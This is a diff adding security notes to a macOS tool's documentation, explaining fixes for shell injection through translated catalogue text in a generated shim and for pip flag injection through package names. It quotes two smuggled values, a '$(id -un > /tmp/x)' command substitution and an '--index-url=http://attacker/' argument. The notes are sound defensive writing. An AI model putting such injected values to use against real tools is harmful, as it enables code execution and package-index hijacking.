@@ -126,3 +126,32 @@ The script runs its reports through Apple's `/usr/bin/python3`, which is 3.9 on
 current macOS and older still on older releases. Using 3.10+ syntax breaks the
 tool exactly on the old machines that need it most. `tests/py39-compat.sh`
 extracts every embedded block and compiles it against 3.9.
+
+## Catalogue text is data, and must reach a generated script as a literal
+
+The `rsvg-convert` shim is generated, so its message has to be written into shell
+source. Interpolating it inside double quotes meant a translation like
+
+```
+shim.format = pwned $(id -un > /tmp/x) %s
+```
+
+ran when the shim took that branch. For a tool that invites translations by
+saying "copy en.msg and translate it", a contributed catalogue is a realistic
+path to code execution, not a theoretical one.
+
+The text now goes in **single** quotes with embedded single quotes escaped as
+`'\''`, where the shell interprets neither `$` nor a backtick. Its `%s` survives
+and is consumed by the shim's own `printf`, which passes `"$fmt"` as a separate
+argument — so the value never enters the format string either.
+
+The same rule holds anywhere else text crosses into generated code: quote it as
+a literal, and pass values as arguments rather than splicing them in.
+
+## A package name starting with a dash is a pip flag
+
+`--wheels <pkgs>` has to expand its list unquoted, or pip gets one argument
+holding everything. That makes every token a potential pip option:
+`--index-url=http://attacker/` would silently redirect resolution to another
+index. Each token is now checked against a PEP 508-ish shape and anything
+starting with `-` is refused.
